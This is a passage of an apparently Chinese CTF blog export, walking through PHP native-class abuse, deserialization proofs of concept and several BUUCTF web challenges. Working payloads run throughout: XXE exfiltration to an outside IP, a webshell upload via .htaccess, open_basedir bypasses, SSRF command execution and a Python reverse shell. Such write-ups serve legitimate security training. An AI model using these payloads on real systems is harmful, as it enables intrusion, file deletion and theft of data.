all \"&lt;!ENTITY &amp;#37; send SYSTEM 'http://174.0.159.143/?%payl;'&gt;\"&gt; 然后进入show.php页面~~我们的参数为： 1/show.php?module=SimpleXMLElement&amp;args[]=http://174.0.159.143/obj.xml&amp;args[]=2&amp;args[]=true 第一个参数为我们obj.xml的地址，这样就能加载obj.xml，再加载e.xml，网站的源码带出。 后续…… 使用 ZipArchive 类来删除文件ZipArchive 类PHP ZipArchive类是PHP的一个原生类，它是在PHP 5.20之后引入的。ZipArchive类可以对文件进行压缩与解压缩处理。 下面列举几个常见的类方法： 123456789ZipArchive::addEmptyDir：添加一个新的文件目录ZipArchive::addFile：将文件添加到指定zip压缩包中ZipArchive::addFromString：添加新的文件同时将内容添加进去ZipArchive::close：关闭ziparchiveZipArchive::extractTo：将压缩包解压ZipArchive::open：打开一个zip压缩包ZipArchive::deleteIndex：删除压缩包中的某一个文件，如：deleteIndex(0)代表删除第一个文件ZipArchive::deleteName：删除压缩包中的某一个文件名称，同时也将文件删除…… 我们来重点看看 ZipArchive::open 方法： 1ZipArchive::open(string $filename, int $flags=0) 该方法用来打开一个新的或现有的zip存档以进行读取，写入或修改。 1234567filename：要打开的ZIP存档的文件名。flags：用于打开档案的模式。有以下几种模式：ZipArchive::OVERWRITE：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。ZipArchive::CREATE：如果不存在则创建一个zip压缩包。ZipArchive::RDONLY：只读模式打开压缩包。ZipArchive::EXCL：如果压缩包已经存在，则出错。ZipArchive::CHECKCONS：对压缩包执行额外的一致性检查，如果失败则显示错误。 注意，如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。 也就是说我们可以利用ZipArchive原生类调用open方法删除目标主机上的文件。下面我们来看一道CTF题目。 梦里花开牡丹亭可看此题：https://blog.csdn.net/jvkyvly/article/details/115052002 进入题目，给出源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?phphighlight_file(__FILE__);error_reporting(0);include('shell.php');class Game&#123; public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() &#123; $this-&gt;username='user'; $this-&gt;password='user'; &#125; public function __wakeup()&#123; if(md5($this-&gt;register)===\"21232f297a57a5a743894a0e4a801fc3\")&#123; // admin $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content); &#125;else&#123; $this-&gt;choice = new register(); &#125; &#125; public function __destruct() &#123; $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password); &#125;&#125;class login&#123; public $file; public $filename; public $content; public function __construct($file,$filename,$content) &#123; $this-&gt;file=$file; $this-&gt;filename=$filename; $this-&gt;content=$content; &#125; public function checking($username,$password) &#123; if($username==='admin'&amp;&amp;$password==='admin')&#123; $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content); die('login success you can to open shell file!'); &#125; &#125;&#125;class register&#123; public function checking($username,$password) &#123; if($username==='admin'&amp;&amp;$password==='admin')&#123; die('success register admin'); &#125;else&#123; die('please register admin '); &#125; &#125;&#125;class Open&#123; function open($filename, $content)&#123; if(!file_get_contents('waf.txt'))&#123; // 当waf.txt没读取成功时才能得到flag shell($content); &#125;else&#123; echo file_get_contents($filename.\".php\"); // filename=php://filter/read=convert.base64-encode/resource=shell &#125; &#125;&#125;if($_GET['a']!==$_GET['b']&amp;&amp;(md5($_GET['a']) === md5($_GET['b'])) &amp;&amp; (sha1($_GET['a'])=== sha1($_GET['b'])))&#123; @unserialize(base64_decode($_POST['unser']));&#125; 开头包含了shell.php，我们可以构造反序列化POC来读取shell.php： 1234567891011121314151617&lt;?phpclass Game&#123; public $username=\"admin\"; public $password=\"admin\"; public $choice=\"xxx\"; public $register=\"admin\"; public $file; public $filename=\"php://filter/read=convert.base64-encode/resource=shell\"; public $content=\"xxx\";&#125;class Open&#123;&#125;$game=new Game();$game-&gt;file=new Open();echo base64_encode(serialize($game)); 执行payload读取到shell.php的源码base64编码,解密得到shell.php 123456789101112&lt;?phpfunction shell($cmd)&#123; if(strlen($cmd)&lt;10)&#123; if(preg_match('/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/',$cmd))&#123; die(\"NO\"); &#125;else&#123; return system($cmd); &#125; &#125;else&#123; die('so long!'); &#125;&#125; 可知我们只要使 file_get_contents(‘waf.txt’) 读取失败就可以进入 shell($content) 来执行系统命令。所以我们应该要想办法将waf.txt这个文件删除，这样就会读取失败，才能执行我们的命令。 要删除waf.txt只能想到原生类了，并且这个原生类中要有一个open()方法。遍历一下能有删除功能函数： 12345678910111213141516&lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123; $methods = get_class_methods($class); foreach ($methods as $method) &#123; if (in_array($method, array( '__destruct', '__wakeup', '__call', '__callStatic', 'open' ))) &#123; print $class . '::' . $method . \"\\n\"; &#125; &#125;&#125; 找到了一个ZipArchive类，其中刚好有一个open()方法刚好符合： 1ZipArchive::open($filename, $flags &#x3D; null) 如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。 所以我们利用ZipArchive原生类调用open方法，即可将即可将$filename（waf.txt）删除： 1ZipArchive::open($filename, ZipArchive::OVERWRITE) 删除waf.txt的poc 123456789101112131415161718&lt;?phpclass Game&#123; public $username=\"admin\"; public $password=\"admin\"; public $choice=\"xxx\"; public $register=\"admin\"; public $file; public $filename; public $content;&#125;class Open&#123;&#125;$game=new Game();$game-&gt;file=new ZipArchive();$game-&gt;content=ZipArchive::OVERWRITE;$game-&gt;filename=\"waf.txt\";echo base64_encode(serialize($game)); 执行后，即可删除waf.txt。接下来就可以使用 n\\l /flag 执行命令读取flag了： 123456789101112131415161718192021&lt;?phpclass Game&#123; public $username=\"admin\"; public $password=\"admin\"; public $choice=\"xxx\"; public $register=\"admin\"; public $file; public $filename; public $content;&#125;class Open&#123;&#125;$game=new Game();$game-&gt;file=new Open();$game-&gt;content=\" n\\l /flag \";$game-&gt;filename=\"xxx\";echo base64_encode(serialize($game)); PHP 原生文件操作类SPLSPL就是Standard PHP Library的缩写。据手册显示，SPL是用于解决 典型问题(standard problems) 的一组接口与类的集合： SPL 对 PHP 引擎进行了扩展，例如 ArrayAccess、Countable 和 SeekableIterator 等接口，它们用于以数组形式操作对象。同时，你还可以使用 RecursiveIterator、ArrayObejcts 等其他迭代器进行数据的迭代操作。它还内置几个的对象例如 Exceptions、SplObserver、Spltorage 以及 splautoloadregister、splclasses、iteratorapply 等的帮助函数（helper functions），用于重载对应的功能。这些工具聚合在一起就好比是把多功能的瑞士军刀，善用它们可以从质上提升 PHP 的代码效率。 因为SPL是要解决典型问题，免不了有一些处理文件的类。下面，我们简单的挑几个SPL中常用的文件处理原生类进行讲解，其他的等以后遇到了在添进来。 可遍历目录类可遍历目录类有以下几个： DirectoryIterator 类 FilesystemIterator 类 GlobIterator 类 DirectoryIterator 类 DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。 类摘要： 1234567891011121314151617181920212223242526272829303132DirectoryIterator extends SplFileInfo implements SeekableIterator &#123; /* 方法 */ public __construct ( string $path ) public current ( ) : DirectoryIterator public getATime ( ) : int public getBasename ( string $suffix = ? ) : string public getCTime ( ) : int public getExtension ( ) : string public getFilename ( ) : string public getGroup ( ) : int public getInode ( ) : int public getMTime ( ) : int public getOwner ( ) : int public getPath ( ) : string public getPathname ( ) : string public getPerms ( ) : int public getSize ( ) : int public getType ( ) : string public isDir ( ) : bool public isDot ( ) : bool public isExecutable ( ) : bool public isFile ( ) : bool public isLink ( ) : bool public isReadable ( ) : bool public isWritable ( ) : bool public key ( ) : string public next ( ) : void public rewind ( ) : void public seek ( int $position ) : void public __toString ( ) : string // 以字符串形式获取文件名 public valid ( ) : bool&#125; 利用 DirectoryIterator 类遍历指定目录里的文件： 如果我们这样： 123&lt;?php$dir=new DirectoryIterator(\"/\");echo $dir; 会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 __toString() 方法，输出指定目录里面经过排序之后的第一个文件名： 也可以配合glob://协议使用模式匹配来寻找我们想要的文件路径： glob:// 协议用来查找匹配的文件路径模式 123&lt;?php$dir=new DirectoryIterator(\"glob:///*flag*\");echo $dir; 如果想输出全部的文件名我们还需要对$dir对象进行遍历： 123456&lt;?php$dir=new DirectoryIterator(\"/\");foreach($dir as $f)&#123; echo($f.'&lt;br&gt;'); //echo($f-&gt;__toString().'&lt;br&gt;');&#125; FilesystemIterator 类 FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。 该类的使用方法与DirectoryIterator 类也是基本相同的： 123&lt;?php$dir=new FilesystemIterator(\"/\");echo $dir; GlobIterator 类 与前两个类的作用相似，GlobIterator 类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob()，可以通过模式匹配来寻找文件路径。 类摘要： 12345678910111213GlobIterator extends FilesystemIterator implements SeekableIterator , Countable &#123; /* 方法 */ public __construct ( string $pattern , int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO ) public count ( ) : int /* 继承的方法 */ public FilesystemIterator::__construct ( string $path , int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO | FilesystemIterator::SKIP_DOTS ) public FilesystemIterator::current ( ) : mixed public FilesystemIterator::getFlags ( ) : int public FilesystemIterator::key ( ) : string public FilesystemIterator::next ( ) : void public FilesystemIterator::rewind ( ) : void public FilesystemIterator::setFlags ( int $flags = ? ) : void&#125; 我们知道，向下面这样在单纯的使用 DirectoryIterator 类和 FilesystemIterator 类且没有配合glob://协议进行匹配的时候： 1234567&lt;?php$dir=new DirectoryIterator(\"/\");echo $dir;&lt;?php$dir=new FilesystemIterator(\"/\");echo $dir; 其构造函数创建的是一个指定目录的迭代器，当我们使用echo函数输出的时候，会触发这两个类中的 __toString() 方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的，而 GlobIterator 类便可以帮我们在一定程度上解决了这个问题。由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。例如，我们在CTF中知道flag在根目录，但是我们不知道flag文件的完整文件名，我们就可以通过类似 GlobIterator(/*flag*)： 123&lt;?php$dir=new GlobIterator(\"/*flag*\");echo $dir; 使用可遍历目录类绕过 open_basedir 使用 DirectoryIterator 类或 FilesystemIterator 类DirectoryIterator与glob://协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。 测试代码： 12345678910&lt;?php$dir = $_GET['whoami'];$a = new DirectoryIterator($dir);foreach($a as $f)&#123; echo($f-&gt;__toString().'&lt;br&gt;');// 不加__toString()也可,因为echo可以自动调用&#125;?&gt;# payload一句话的形式:$a = new DirectoryIterator(\"glob:///*\");foreach($a as $f)&#123;echo($f-&gt;__toString().'&lt;br&gt;');&#125; 我们输入 /?whoami=glob:///* 即可列出根目录下的所有文件 使用 GlobIterator 类由于使用 GlobIterator 类支持直接通过模式匹配来寻找文件路径，所以我们就不用在配合glob://协议了。 测试代码： 12345678910&lt;?php$dir = $_GET['whoami'];$a = new GlobIterator($dir);foreach($a as $f)&#123; echo($f-&gt;__toString().'&lt;br&gt;');// 不加__toString()也可,因为echo可以自动调用&#125;?&gt;# payload一句话的形式:$a = new FilesystemIterator(\"/*\");foreach($a as $f)&#123;echo($f-&gt;__toString().'&lt;br&gt;');&#125; 可读取文件类目前发现的可读取文件类有： SplFileObject 类 SplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。详情请参考：https://www.php.net/manual/zh/class.splfileobject.php 该类的构造方法可以构造一个新的文件对象用于后续的读取。 我们可以像类似下面这样去读取一个文件的一行： 123&lt;?php$context = new SplFileObject('/etc/passwd');echo $context; 但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历： 12345&lt;?php$context = new SplFileObject('/etc/passwd');foreach($context as $f)&#123; echo($f);&#125; [2021 MAR DASCTF 明御攻防赛]ez_serialize进入题目，给出源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phperror_reporting(0);highlight_file(__FILE__);class A&#123; public $class; public $para; public $check; public function __construct() &#123; $this-&gt;class = \"B\"; $this-&gt;para = \"ctfer\"; echo new $this-&gt;class ($this-&gt;para); &#125; public function __wakeup() // 可以直接绕过__wakeup()方法的执行 &#123; $this-&gt;check = new C; if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) &#123; echo new $this-&gt;class ($this-&gt;para); &#125; else die('bad hacker~'); &#125;&#125;class B&#123; var $a; public function __construct($a) &#123; $this-&gt;a = $a; echo (\"hello \".$this-&gt;a); &#125;&#125;class C&#123; function vaild($code)&#123; $pattern = '/[!|@|#|$|%|^|&amp;|*|=|\\'|\"|:|;|?]/i'; if (preg_match($pattern, $code))&#123; return false; &#125; else return true; &#125;&#125;if(isset($_GET['pop']))&#123; unserialize($_GET['pop']);&#125;else&#123; $a=new A;&#125; 在A类中可以动态拼接类，就像PHP动态执行函数一样。但是题目给出的A、B、C三个类但是都没有什么危险函数，应该是没有利用的点，想到应该是原生类的利用。我们可以利用上面说的那几个文件处理的原生去读文件。 123456789101112首先利用DirectoryIterator或FilesystemIterator类去遍历目标的Web目录：&lt;?phpclass A&#123; public $class='FilesystemIterator'; // FilesystemIterator(\"/var/www/html\") public $para=\"/var/www/html/\"; public $check; &#125;$poc = new A();echo serialize($poc); 得到payload： 1O:1:\"A\":3:&#123;s:5:\"class\";s:18:\"FilesystemIterator\";s:4:\"para\";s:14:\"/var/www/html/\";s:5:\"check\";N;&#125; 执行后得到一个文件夹 aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE,并在这个文件夹中找到了flag.php. 然后我们使用 SplFileObject 类读取flag.php就行了： 12345678910&lt;?phpclass A&#123; public $class='SplFileObject'; // SplFileObject(\"/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php\") public $para=\"/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php\"; public $check; &#125;$poc = new A();echo serialize($poc); 参考文章：PHP 原生类在 CTF 中的利用： https://www.anquanke.com/post/id/238482 从几道CTF题看SOAP安全问题: https://www.anquanke.com/post/id/153065","categories":[],"tags":[]},{"title":"BUUCTF刷题二","slug":"BUUCTF刷题二","date":"2021-05-05T15:44:56.000Z","updated":"2021-06-15T04:11:06.350Z","comments":true,"path":"article/1ca7c18f.html","link":"","permalink":"https://blog.cfyqy.com/article/1ca7c18f.html","excerpt":"无感情的刷题机器","text":"无感情的刷题机器 [SUCTF 2019]EasyWeb1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpfunction get_the_flag()&#123; &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!! $userdir &#x3D; &quot;upload&#x2F;tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]); if(!file_exists($userdir))&#123; mkdir($userdir); &#125; if(!empty($_FILES[&quot;file&quot;]))&#123; $tmp_name &#x3D; $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; $name &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;]; $extension &#x3D; substr($name, strrpos($name,&quot;.&quot;)+1); if(preg_match(&quot;&#x2F;ph&#x2F;i&quot;,$extension)) die(&quot;^_^&quot;); if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!&#x3D;&#x3D;False) die(&quot;^_^&quot;); if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); $path&#x3D; $userdir.&quot;&#x2F;&quot;.$name; @move_uploaded_file($tmp_name, $path); print_r($path); &#125;&#125;$hhh &#x3D; @$_GET[&#39;_&#39;];if (!$hhh)&#123; highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123; die(&#39;One inch long, one inch strong!&#39;);&#125;if ( preg_match(&#39;&#x2F;[\\x00- 0-9A-Za-z\\&#39;&quot;\\&#96;~_&amp;.,|&#x3D;[\\x7F]+&#x2F;i&#39;, $hhh) ) die(&#39;Try something else!&#39;);$character_type &#x3D; count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt; 考点一： 构造不包含数字和字母的webshell 1234567891011121314151617181920212223&lt;?php$l = \"\";$r = \"\";$argv = str_split(\"_GET\");for($i=0;$i&lt;count($argv);$i++)&#123; for($j=0;$j&lt;255;$j++) &#123; $k = chr($j)^chr(255); \\\\dechex(255) = ff if($k == $argv[$i])&#123; if($j&lt;16)&#123; $l .= \"%ff\"; $r .= \"%0\" . dechex($j); continue; &#125; $l .= \"%ff\"; $r .= \"%\" . dechex($j); continue; &#125; &#125;&#125;echo \"\\&#123;$l`$r\\&#125;\";?&gt; 这里的话我们异或只能构造GET型，POST不行 然后配合 1$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;ff&#x3D;phpinfo ，可以执行一些函数。 考点二： 参考链接https://www.dazhuanlan.com/2019/12/17/5df803f62c08a/ nginx的服务器，而且上传目录下有一个php文件，所以上窜.user.iniapache的服务器，应该上传.htaccess两个要注意的点是: .htaccess上传的时候不能用GIF89a等文件头去绕过exif_imagetype,因为这样虽然能上传成功，但.htaccess文件无法生效。这时有两个办法: 12#define width 1337#define height 1337 在.htaccess前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型)x00x00x8ax39x8ax39 是wbmp文件的文件头.htaccess中以0x00开头的同样也是注释符，所以不会影响.htaccess这里的php是7.2的版本，无法使用 1&lt;script language&#x3D;&quot;php&quot;&gt;&lt;&#x2F;script&gt; 来绕过对&lt;?的检测ps:可以通过编码进行绕过，如原来使用utf8编码，如果shell中是用utf16编码则可以Bypass我们这里的解决方法是将一句话进行base64编码，然后在.htaccess中利用php伪协议进行解码,比如: 1234#define width 1337#define height 1337AddType application&#x2F;x-httpd-php .abcphp_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;tmp_fd40c7f4125a9b9ff1a4e75d293e3080&#x2F;shell.abc&quot; shell.abc： 1GIF89a12PD9waHAgZXZhbCgkX0dFVFsnYyddKTs&#x2F;Pg&#x3D;&#x3D; 这里GIF89a后面那个12是为了补足8个字节，满足base64编码的规则,使用其他的文件头也是可以的贴一个上传的脚本 1234567891011121314151617181920import requestsimport base64htaccess &#x3D; b&quot;&quot;&quot;#define width 1337#define height 1337 AddType application&#x2F;x-httpd-php .abcphp_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;tmp_fd40c7f4125a9b9ff1a4e75d293e3080&#x2F;shell.abc&quot;&quot;&quot;&quot;shell &#x3D; b&quot;GIF89a12&quot; + base64.b64encode(b&quot;&lt;?php eval($_REQUEST[&#39;a&#39;]);?&gt;&quot;)url &#x3D; &quot;http:&#x2F;&#x2F;16855023-61d5-430f-bbef-53d0bca8f179.node1.buuoj.cn?_&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe&#x3D;get_the_flag&quot;files &#x3D; &#123;&#39;file&#39;:(&#39;.htaccess&#39;,htaccess,&#39;image&#x2F;jpeg&#39;)&#125;data &#x3D; &#123;&quot;upload&quot;:&quot;Submit&quot;&#125;response &#x3D; requests.post(url&#x3D;url, data&#x3D;data, files&#x3D;files)print(response.text)files &#x3D; &#123;&#39;file&#39;:(&#39;shell.abc&#39;,shell,&#39;image&#x2F;jpeg&#39;)&#125;response &#x3D; requests.post(url&#x3D;url, data&#x3D;data, files&#x3D;files)print(response.text) 知识点三 绕过open_basedir/disable_function 123456open_basedir是php.ini中的一个配置选项它可将用户访问文件的活动范围限制在指定的区域，假设open_basedir&#x3D;&#x2F;home&#x2F;wwwroot&#x2F;home&#x2F;web1&#x2F;:&#x2F;tmp&#x2F;，那么通过web1访问服务器的用户就无法获取服务器上除了&#x2F;home&#x2F;wwwroot&#x2F;home&#x2F;web1&#x2F;和&#x2F;tmp&#x2F;这两个目录以外的文件。注意用open_basedir指定的限制实际上是前缀,而不是目录名。举例来说: 若&quot;open_basedir &#x3D; &#x2F;dir&#x2F;user&quot;, 那么目录 &quot;&#x2F;dir&#x2F;user&quot; 和 &quot;&#x2F;dir&#x2F;user1&quot;都是可以访问的。 所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。payload 1chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo(file_get_contents(&#39;flag&#39;)); 解题 [BJDCTF2020]EzPHP1nD3x.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phphighlight_file(__FILE__);error_reporting(0); $file = \"1nD3x.php\";$shana = $_GET['shana'];$passwd = $_GET['passwd'];$arg = '';$code = '';echo \"&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;\";if($_SERVER) &#123; if ( preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\"|\\'|log/i', $_SERVER['QUERY_STRING']) ) die('You seem to want to do something bad?'); &#125;if (!preg_match('/http|https/i', $_GET['file'])) &#123; if (preg_match('/^aqua_is_cute$/', $_GET['debu']) &amp;&amp; $_GET['debu'] !== 'aqua_is_cute') &#123; $file = $_GET[\"file\"]; echo \"Neeeeee! Good Job!&lt;br&gt;\"; &#125; &#125; else die('fxck you! What do you want to do ?!');if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123; if(preg_match('/[a-zA-Z]/i', $value)) die('fxck you! I hate English!'); &#125; &#125; if (file_get_contents($file) !== 'debu_debu_aqua') die(\"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;\");if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123; extract($_GET[\"flag\"]); echo \"Very good! you know my password. But what is flag?&lt;br&gt;\";&#125; else&#123; die(\"fxck you! you don't know my password! And you don't know sha1! why you come here!\");&#125;if(preg_match('/^[a-z0-9]*$/isD', $code) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) &#123; die(\"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=\"); &#125; else &#123; include \"flag.php\"; $code('', $arg); &#125; ?&gt; [HITCON 2017]SSRFme题目 12345678910111213141516171819&lt;?php if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) &#123; $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']); $_SERVER['REMOTE_ADDR'] = $http_x_headers[0]; &#125; echo $_SERVER[\"REMOTE_ADDR\"]; $sandbox = \"sandbox/\" . md5(\"orange\" . $_SERVER[\"REMOTE_ADDR\"]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec(\"GET \" . escapeshellarg($_GET[\"url\"])); $info = pathinfo($_GET[\"filename\"]); $dir = str_replace(\".\", \"\", basename($info[\"dirname\"])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[\"basename\"]), $data); highlight_file(__FILE__); 方法一: file 协议利用 open 命令执行要执行的命令先前必须要有以命令为文件名的文件存在所以需要执行两次payload 1?url=file:ls /|&amp;filename=ls /| #两次 管道符好像必须要加， 1http:&#x2F;&#x2F;efc32bf2-e10f-4e22-bdf0-9a17856f32f0.node3.buuoj.cn&#x2F;sandbox&#x2F;fcf2bccafc269c160382150a0166d632&#x2F;ls &#x2F;| 然后readflag，如果直接/readflag的话，那么会在服务器的根目录创建这个文件，而不是在网站的那个目录，所以是无法命令执行的，所以可以用bash -c 相当于./readflag，而根据php字符解析特性，如果直接将./readflag传入，那么.就会变成下划线,从而不能命令执行。直接bash的话好像是只能bash 有sh后缀的文件，所以不能用。 1?url=file:bash -c /readflag|&amp;filename=bash -c /readflag| 方法二： 在vps写入一个马ma.txt 1一句话 payload 1?filename=ma.php&amp;url=vps.ip/ma.txt [b01lers2020]Welcome to Earth[HarekazeCTF2019]encode_and_encode12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phperror_reporting(0);if (isset($_GET['source'])) &#123; show_source(__FILE__); exit();&#125;function is_valid($str) &#123; $banword = [ // no path traversal '\\.\\.', // no stream wrapper '(php|file|glob|data|tp|zip|zlib|phar):', // no data exfiltration 'flag' ]; $regexp = '/' . implode('|', $banword) . '/i'; if (preg_match($regexp, $str)) &#123; return false; &#125; return true;&#125;$body = file_get_contents('php://input');$json = json_decode($body, true);if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json['page'])) &#123; $page = $json['page']; $content = file_get_contents($page); if (!$content || !is_valid($content)) &#123; $content = \"&lt;p&gt;not found&lt;/p&gt;\\n\"; &#125;&#125; else &#123; $content = '&lt;p&gt;invalid request&lt;/p&gt;';&#125;// no data exfiltration!!!$content = preg_replace('/HarekazeCTF\\&#123;.+\\&#125;/i', 'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;', $content);echo json_encode(['content' =&gt; $content]); payload 可以用unicode编码绕过 1&#123;&quot;page&quot;:&quot;p\\u0068\\u0070:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;\\u0066\\u006c\\u0061\\u0067&quot;&#125; [网鼎杯 2020 白虎组]PicDown存在任意文件读取非预期可直接读flag 1..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag 预期 读取/proc/self/environ 读取进程运行的环境变量/proc/self/cmdline 读取当前进程运行的命令 读取../../../../../app/app.py源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp = Flask(__name__)SECRET_FILE = \"/tmp/secret.txt\"f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE)@app.route('/')def index(): return render_template('search.html')@app.route('/page')def page(): url = request.args.get(\"url\") try: if not url.lower().startswith(\"file\"): res = urllib.urlopen(url) value = res.read() response = Response(value, mimetype='application/octet-stream') response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg' return response else: value = \"HACK ERROR!\" except: value = \"SOMETHING WRONG!\" return render_template('search.html', res=value)@app.route('/no_one_know_the_manager')def manager(): key = request.args.get(\"key\") print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get(\"shell\") os.system(shell) res = \"ok\" else: res = \"Wrong Key!\" return resif __name__ == '__main__': app.run(host='0.0.0.0', port=8080) 可以看到no_one_know_the_manager中要匹配SECRET_KEY，然后执行shell，但是SECRET_KEY所在的secret.txt被删掉了此处可以通过/proc/pid/fd/读取，这个目录包含了进程打开的每一个文件的链接 执行命令后无回显,本地使用python反弹shell 1python -c \"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('174.1.99.145',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\" [watevrCTF-2019]Cookie Store点击买flag,修改cooke的session的base64解码后的参数为200，在返回的history中解码后，即可得flag。 [WUSTCTF2020]CV Maker注册一个用户登录后，直接上传php类型的文件。 [BJDCTF2020]EzPHP知识点 1234567base32url编码绕过preg_match在非&#x2F;s模式下的绕过$_POST和$_GET的优先级PHP伪协议。sha1函数的数组绕过。create_function()的代码注入 页面源码 找到一个base32的字符串，解码得1nD3x.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phphighlight_file(__FILE__);error_reporting(0); $file = \"1nD3x.php\";$shana = $_GET['shana'];$passwd = $_GET['passwd'];$arg = '';$code = '';echo \"&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;\";if($_SERVER) &#123; if ( preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\"|\\'|log/i', $_SERVER['QUERY_STRING']) ) die('You seem to want to do something bad?'); &#125;if (!preg_match('/http|https/i', $_GET['file'])) &#123; if (preg_match('/^aqua_is_cute$/', $_GET['debu']) 